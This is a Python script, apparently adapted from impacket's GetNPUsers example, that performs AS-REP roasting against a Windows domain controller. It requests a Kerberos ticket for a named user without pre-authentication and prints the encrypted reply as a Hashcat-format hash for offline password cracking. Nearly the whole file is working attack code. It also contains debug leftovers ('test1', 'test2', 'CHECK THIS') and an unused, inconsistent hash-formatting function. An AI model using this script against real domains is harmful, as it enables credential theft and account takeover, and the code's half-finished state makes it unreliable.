#!/usr/bin/env python3

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import sys
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from optparse import OptionParser

def getTGT(userName, domain_name, kdcHost, requestPAC=True):

    clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    asReq = AS_REQ()

    domain = domain_name.upper()
    serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    pacRequest = KERB_PA_PAC_REQUEST()
    pacRequest['include-pac'] = requestPAC
    encodedPacRequest = encoder.encode(pacRequest)

    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    asReq['padata'] = noValue
    asReq['padata'][0] = noValue
    asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    asReq['padata'][0]['padata-value'] = encodedPacRequest

    reqBody = seq_set(asReq, 'req-body')

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable_ok.value)
    opts.append(constants.KDCOptions.proxiable.value)
    reqBody['kdc-options'] = constants.encodeFlags(opts)

    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    seq_set(reqBody, 'cname', clientName.components_to_asn1)

    if domain == '':
        raise Exception('Empty Domain not allowed in Kerberos')

    reqBody['realm'] = domain

    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    reqBody['till'] = KerberosTime.to_asn1(now)
    reqBody['rtime'] = KerberosTime.to_asn1(now)
    reqBody['nonce'] = random.getrandbits(31)

    # CHECK THIS
    supportedCiphers = (31,)

    seq_set_iter(reqBody, 'etype', supportedCiphers)

    message = encoder.encode(asReq)

    try:
        r = sendReceive(message, domain, kdcHost)
        print("test1")
    except KerberosError as e:
        print("test2")
        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
            raise e
        else:
            raise e

    # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
    # 'Do not require Kerberos preauthentication' set
    try:
        asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
    except:
        # Most of the times we shouldn't be here, is this a TGT?
        asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
    else:
        # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
        raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

  
    # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
    # Check what type of encryption is used for the enc-part data
    # This will inform how the hash output needs to be formatted
    if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
        return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                             hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                             hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
    else:
        return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                              hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                              hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

def parseASREPHash(response, username, domain):
    asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
    cipher = asRep['enc-part']['cipher'].asOctets()
    cipher_hex = hexlify(cipher).decode()

    encType = int(asRep['enc-part']['etype'])

    if encType == constants.EncryptionTypes.rc4_hmac.value:
        hash_str = '$krb5asrep$23$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    elif encType == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        hash_str = '$krb5asrep$18$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    elif encType == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        hash_str = '$krb5asrep$17$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    else:
        logging.warning('Unsupported encryption type: %d' % encType)
        return None

    return hash_str


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option('-u', '--user', help='Target username')
    parser.add_option('-d', '--domain', help='Domain name')
    parser.add_option('--dc-ip', help='Domain Controller IP')
    parser.add_option('-v', action='store_true', help='Verbose output')

    (options, args) = parser.parse_args()

    if not options.user or not options.domain or not options.dc_ip:
        parser.print_help()
        sys.exit(1)

    if options.v:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    username = options.user
    domain = options.domain
    dc_ip = options.dc_ip

    try:
        logging.info('Requesting AS-REP for user: %s' % username)
        response = getTGT(username, domain, dc_ip)

        print(response)
    except Exception as e:
        logging.error('Error: %s' % str(e))
        sys.exit(1)
